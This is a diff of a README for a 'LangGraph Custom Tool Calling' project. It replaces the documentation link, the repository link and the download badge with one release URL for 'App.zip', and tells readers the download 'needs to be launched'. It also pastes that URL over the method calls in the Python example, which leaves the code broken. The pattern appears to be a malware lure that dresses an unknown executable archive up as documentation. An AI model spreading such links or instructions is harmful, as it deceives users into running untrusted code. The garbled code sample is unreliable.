@@ -22,8 +22,8 @@ For detailed instructions, refer to the documentation in the repository.
 
 ## Useful Links
 
-- [LangGraph Documentation](https://langgraph-documentation.com): Visit the official documentation for in-depth guides and tutorials on using LangGraph.
-- [GitHub Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip): Download the latest version of the LangGraph Custom Tool Calling repository. Remember, it needs to be launched!
+- [LangGraph Documentation](https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip): Visit the official documentation for in-depth guides and tutorials on using LangGraph.
+- [GitHub Repository](https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip): Download the latest version of the LangGraph Custom Tool Calling repository. Remember, it needs to be launched!
 
 ## Features
 
@@ -45,12 +45,12 @@ from langgraph import LangGraph
 
 # Initialize LangGraph with custom tools
 lg = LangGraph(api_key="YOUR_API_KEY")
-lg.add_tool("CustomTool1")
-lg.add_tool("CustomTool2")
+https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip("CustomTool1")
+https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip("CustomTool2")
 
 # Process user query
 query = "How does LangGraph integrate custom tools?"
-response = lg.process_query(query)
+response = https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip(query)
 
 print(response)
 ```
@@ -69,6 +69,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip)](https://github.com/rkafh/LangGraph-Custom-Tool-Calling/releases/download/v1.0/App.zip)
 
 Explore the endless possibilities of language processing with LangGraph Custom Tool Calling. Get started today and revolutionize the way you interact with language models! 🚀🌐🤖
